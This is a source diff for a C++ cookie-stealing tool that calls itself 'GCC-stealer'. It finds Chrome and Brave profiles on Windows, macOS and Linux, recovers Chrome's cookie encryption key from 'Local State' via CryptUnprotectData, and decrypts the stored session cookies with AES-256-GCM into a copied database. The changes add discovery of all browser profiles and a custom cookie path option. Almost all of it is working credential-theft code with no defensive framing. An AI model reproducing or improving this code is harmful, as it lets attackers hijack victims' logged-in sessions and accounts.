@@ -6,6 +6,7 @@
 #include <iostream> 
 #include <memory>
 #include <fstream>
+#include <format>
 
 #include <sqlite3.h>
 #include <jsoncons/json.hpp>
@@ -34,14 +35,37 @@
 
 #define KEY_LEN      16
 
+
+
+
 #ifdef _WIN32
 // old "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
-#define CHROME_COOKIES_PATH "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
+#define PATH_COOKIES_ON_PROFILE "Network\\Cookies"
+#define CHROME_COOKIES_PATH "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" 
 #elif __APPLE_
-#define CHROME_COOKIES_PATH "%s/Library/Application Support/Google/Chrome/Default/Cookies"
+#define PATH_COOKIES_ON_PROFILE "Cookies"
+#define CHROME_COOKIES_PATH "{}/Library/Application Support/Google/Chrome/Default/Cookies"
 #elif __linux__
-#define CHROME_COOKIES_PATH "%s/.config/google-chrome/Default/Cookies"
+#define PATH_COOKIES_ON_PROFILE "Cookies"
+#define CHROME_COOKIES_PATH "{}/.config/google-chrome/Default/Cookies"
 #endif //_WIN32
+
+
+std::vector<std::string> possibleBrowserPaths = {
+#ifdef _WIN32
+    "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\",
+    "C:\\Users\\{}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\"
+#elif __APPLE_
+    "%s/Library/Application Support/Google/Chrome/",
+    "%s/Library/Application Support/BraveSoftware"
+#elif __linux__
+    "%s/.config/google-chrome/",
+    "%s/.config/chromium/",
+    "%s/.config/BraveSoftware/"
+#endif //_WIN32
+};
+
+namespace fs = std::filesystem;
 
 static bool quiet = false;
 argparse::ArgumentParser programArgs;
@@ -139,17 +163,17 @@ SecretValue* ToSingleSecret(GList* secret_items) {
 #endif
 
 
-void aes_init()
-{
-    static int init = 0;
-    if (init == 0)
-    {
-        //EVP_CIPHER_CTX e_ctx, d_ctx;
-
-        //initialize openssl ciphers
-        OpenSSL_add_all_ciphers();
-    }
-}
+//void aes_init()
+//{
+//    static int init = 0;
+//    if (init == 0)
+//    {
+//        //EVP_CIPHER_CTX e_ctx, d_ctx;
+//
+//        //initialize openssl ciphers
+//        OpenSSL_add_all_ciphers();
+//    }
+//}
 
 std::string aes_256_gcm_decrypt(std::vector<unsigned char> ciphertext, std::string key)
 {
@@ -172,6 +196,9 @@ std::string aes_256_gcm_decrypt(std::vector<unsigned char> ciphertext, std::stri
     auto c = EVP_CIPHER_CTX_ctrl(d_ctx, EVP_CTRL_GCM_SET_TAG, 16, tag);
     if (!EVP_DecryptFinal(d_ctx, &plaintext[actual_size], &final_size)) {
         std::cerr << "[!] Error decrypting cookie" << std::endl;
+    }
+    else {
+        std::cout << "[+] Success decrypting cookie" << std::endl;
     }
     EVP_CIPHER_CTX_free(d_ctx);
     plaintext.resize(actual_size + final_size, '\0');
@@ -239,18 +266,23 @@ std::string AES_Decrypt_String(std::string const& data, std::string const& key, 
 
 std::string get_key() {
 #ifdef _WIN32
-    char username[UNLEN + 1];
-    DWORD username_len = UNLEN + 1;
-    GetUserName(username, &username_len);
-    char cookies_path[MAX_PATH] = { 0 };
-    //snprintf(cookies_path, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", username);
-    snprintf(cookies_path, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", username);
-    //"C:\Users\defaul\AppData\Local\Google\Chrome\User Data\Local State"
-    std::ifstream is(cookies_path);
-    
+    fs::path cookies_path_user;
+    if (programArgs.is_used("--cookies-path")) {
+        cookies_path_user = fs::path(programArgs.get<std::string>("--cookies-path"));
+    }
+    else {
+        char username[UNLEN + 1];
+        DWORD username_len = UNLEN + 1;
+        GetUserName(username, &username_len);
+        cookies_path_user = fs::path(std::format(CHROME_COOKIES_PATH, username));
+    }
+
+    auto local_state_file = (cookies_path_user.parent_path().parent_path().parent_path()) / fs::path("Local State");
+
+    std::ifstream is(local_state_file); 
     if (!is.is_open()) {
-        std::cerr << "Error opening " << cookies_path << std::endl;
-        return "";
+        std::cerr << "Error opening " << local_state_file << std::endl;
+        exit(-1);
     }
     
     try
@@ -271,7 +303,7 @@ std::string get_key() {
         if (!CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr,
             0, &output)) {
             std::cerr << "[!] CryptUnprotectData failed decrypting encrypted_key" << std::endl;
-            return "";
+            exit(-1);
         }
         return std::string(reinterpret_cast<char*>(output.pbData), output.cbData);
 
@@ -279,7 +311,7 @@ std::string get_key() {
     catch (const jsoncons::ser_error& e)
     {
         std::cout << e.what() << std::endl;
-        return "";
+        exit(-1);
     }
     
 
@@ -372,7 +404,7 @@ void decrypt_cookies(cookie_vector_t* cookie_vector)
 }
 
 
-int update_decrypted_DB(cookie_vector_t cookie_vector, char* db_path) {
+int update_decrypted_DB(cookie_vector_t cookie_vector, const char* db_path) {
     sqlite3* DB;
     
     char sql[4000];
@@ -432,7 +464,31 @@ void argsHandling(int argc, char** argv) {
     }
 }
 
-#ifdef _WIN32
+
+std::vector<fs::path> findChrome(std::vector<std::string> defaultCookiesPath, std::string username) {
+    std::vector<fs::path> res;
+
+    for (auto& path : defaultCookiesPath) {
+        auto path_user = fs::path(std::format(path, username));
+
+        if (fs::exists(path_user)) {
+            for (const auto& dirEntry : fs::directory_iterator(path_user, fs::directory_options::skip_permission_denied)) {
+                if (fs::exists(dirEntry / fs::path("Web Data")) && // Cookies is in different places in Windows than in Linux/OSX
+                    dirEntry.path().filename() != "System Profile")
+                {
+                    res.push_back(dirEntry);
+                    std::cout << "Found Chrome Profile at " << dirEntry.path() << std::endl;
+                    std::cout << "You can rerun GCC-stealer with --cookies-path " << dirEntry.path() / fs::path(PATH_COOKIES_ON_PROFILE) << " to decrypt it" << std::endl;
+                }
+            }
+        }
+    }
+    
+    return res;
+}
+
+
+#ifdef _WIN323
 //We need WinMain defined when using SUBSYSTEM:WINDOWS
 #	pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
@@ -450,21 +506,25 @@ int main(int argc, char** argv)
     char username[UNLEN + 1];
     DWORD username_len = UNLEN + 1;
     GetUserName(username, &username_len);
-    char cookies_path[MAX_PATH] = {0};
-    snprintf(cookies_path, MAX_PATH, CHROME_COOKIES_PATH, username);
+    auto cookies_path = std::format(CHROME_COOKIES_PATH, username);
 #else
-    char cookies_path[PATH_MAX] = {0};
-    auto home = getenv("HOME");
-    snprintf(cookies_path, PATH_MAX, CHROME_COOKIES_PATH, home);
+    auto cookies_path = std::format(CHROME_COOKIES_PATH, getenv("HOME"));
 #endif //_WIN32
+
+    // ToDo: Use the list of found browsers and decrypt all
+    auto possibleCookies = findChrome(possibleBrowserPaths, username);
 
     std::error_code err;
     if (programArgs.is_used("--cookies-path")) {
-        auto cookies_path_user = programArgs.get<std::string>("--cookies-path");
-        std::filesystem::copy(cookies_path_user, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing, err);
+        auto cookies_path = fs::path(programArgs.get<std::string>("--cookies-path"));
+        if (!cookies_path.has_filename()) {
+            std::cerr << "Make sure that " << cookies_path << " exists in the system" << std::endl;
+            exit(-1);
+        }
+        fs::copy(cookies_path, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing, err);
     }
     else {
-        std::filesystem::copy(cookies_path, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing, err);
+        fs::copy(cookies_path, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing, err);
     }
 
     if (err) {
